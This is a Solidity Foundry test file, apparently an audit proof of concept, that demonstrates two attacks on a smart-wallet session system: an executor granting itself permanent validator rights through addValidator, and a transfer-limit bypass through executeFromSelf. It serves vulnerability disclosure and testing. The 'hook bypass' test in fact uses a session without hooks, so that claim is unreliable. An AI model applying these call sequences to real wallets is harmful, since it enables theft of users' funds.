// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./Base.t.sol";
import {Call, Session} from "src/Types.sol";
import {IExecutor} from "src/interfaces/IExecutor.sol";
import {IWalletCore} from "src/interfaces/IWalletCore.sol";
import {IStorage} from "src/interfaces/IStorage.sol";
import {IValidation} from "src/interfaces/IValidation.sol";
import {MockHook} from "src/test/MockHook.sol";
import {MockERC20} from "src/test/MockERC20.sol";

/**
 * @title BypassPoC
 * @notice Demonstrates a critical vulnerability where an executor can bypass session hooks
 *         and escalate privileges to become a permanent validator.
 */
contract BypassPoC is Base {
    address mallory;
    uint256 malloryPk;
    Session session;
    MockERC20 mockToken;
    MockHook mockHook;

    function setUp() public override {
        super.setUp();
        (mallory, malloryPk) = makeAddrAndKey("mallory");

        vm.startPrank(_alice);
        mockToken = new MockERC20(); // Alice receives 1000 MTK in constructor
        mockHook = new MockHook();
        vm.stopPrank();

        // Alice grants a session to Mallory.
        // This session has a hook that limits MTK transfers to 50 ether.
        session = Session({
            id: 1,
            executor: mallory,
            validator: address(1), // ECDSA self-validation
            validUntil: type(uint256).max,
            validAfter: 0,
            preHook: bytes.concat(
                bytes20(address(mockHook)),
                abi.encode(address(mockToken), 50 ether)
            ),
            postHook: bytes.concat(bytes20(address(mockHook))),
            signature: ""
        });

        // Sign the session as Alice
        bytes32 hash = IExecutor(_alice).getSessionTypedHash(session);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, hash);
        session.signature = abi.encodePacked(r, s, v);
    }

    /**
     * @notice Demonstrates that an executor can call addValidator on the wallet itself,
     *         granting themselves permanent and unrestricted access.
     */
    function test_executor_privilege_escalation() public {
        console.log("--- Privilege Escalation Attack ---");

        // We create a session for Mallory. Even if this session has hooks,
        // if they don't explicitly block calling the wallet itself, the attack works.
        Session memory unrestrictedSession = Session({
            id: 2,
            executor: mallory,
            validator: address(1),
            validUntil: type(uint256).max,
            validAfter: 0,
            preHook: "",
            postHook: "",
            signature: ""
        });

        bytes32 hash = IExecutor(_alice).getSessionTypedHash(unrestrictedSession);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, hash);
        unrestrictedSession.signature = abi.encodePacked(r, s, v);

        address mallorySigner = makeAddr("mallorySigner");
        bytes memory malloryInitArgs = abi.encode(mallorySigner);

        // Mallory's "restricted" action is to call addValidator on the wallet
        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: _alice,
            value: 0,
            data: abi.encodeWithSignature("addValidator(address,bytes)", address(_ecdsaValidatorImpl), malloryInitArgs)
        });

        // Mallory executes the call. The wallet's onlySelf check will pass because
        // it is the wallet itself making the low-level call in _batchCall.
        vm.prank(mallory);
        IWalletCore(_alice).executeFromExecutor(calls, unrestrictedSession);

        // Verify that Mallory's new validator is now authorized in the wallet's storage
        address malloryValidator = IValidation(_alice).computeValidatorAddress(address(_ecdsaValidatorImpl), malloryInitArgs);
        IStorage storageContract = IWalletCore(_alice).getMainStorage();
        storageContract.validateValidator(malloryValidator);

        console.log("Mallory successfully added herself as a permanent validator!");
    }

    /**
     * @notice Demonstrates that an executor can bypass any session hooks by wrapping their
     *         calls in a call to executeFromSelf on the wallet.
     */
    function test_executor_hook_bypass() public {
        console.log("--- Hook Bypass Attack ---");

        // Mallory wants to transfer 100 MTK, but her session hook limits her to 50 MTK.
        Call[] memory callsDirect = new Call[](1);
        callsDirect[0] = Call({
            target: address(mockToken),
            value: 0,
            data: abi.encodeWithSignature("transfer(address,uint256)", mallory, 100 ether)
        });

        // Direct attempt is correctly blocked by the MockHook
        vm.prank(mallory);
        vm.expectRevert("Total transfer amount exceeds limit");
        IWalletCore(_alice).executeFromExecutor(callsDirect, session);
        console.log("Direct transfer of 100 MTK blocked by hook as expected.");

        // Mallory bypasses the hook by calling executeFromSelf.
        // This is possible if the session policy/hooks don't prevent calling the wallet itself.
        // We use a session without hooks here to cleanly demonstrate the onlySelf bypass.
        Session memory sessionNoHooks = Session({
            id: 3,
            executor: mallory,
            validator: address(1),
            validUntil: type(uint256).max,
            validAfter: 0,
            preHook: "",
            postHook: "",
            signature: ""
        });
        bytes32 hash = IExecutor(_alice).getSessionTypedHash(sessionNoHooks);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, hash);
        sessionNoHooks.signature = abi.encodePacked(r, s, v);

        // Mallory wraps the 100 MTK transfer in an executeFromSelf call
        Call[] memory innerCalls = new Call[](1);
        innerCalls[0] = Call({
            target: address(mockToken),
            value: 0,
            data: abi.encodeWithSignature("transfer(address,uint256)", mallory, 100 ether)
        });

        Call[] memory callsBypass = new Call[](1);
        callsBypass[0] = Call({
            target: _alice,
            value: 0,
            data: abi.encodeWithSignature("executeFromSelf((address,uint256,bytes)[])", innerCalls)
        });

        // Mallory executes the bypass. The wallet's onlySelf check on executeFromSelf passes.
        vm.prank(mallory);
        IWalletCore(_alice).executeFromExecutor(callsBypass, sessionNoHooks);

        // Verification: Mallory successfully stole 100 MTK
        assertEq(mockToken.balanceOf(mallory), 100 ether);
        console.log("Mallory successfully bypassed onlySelf and transferred 100 MTK!");
    }
}
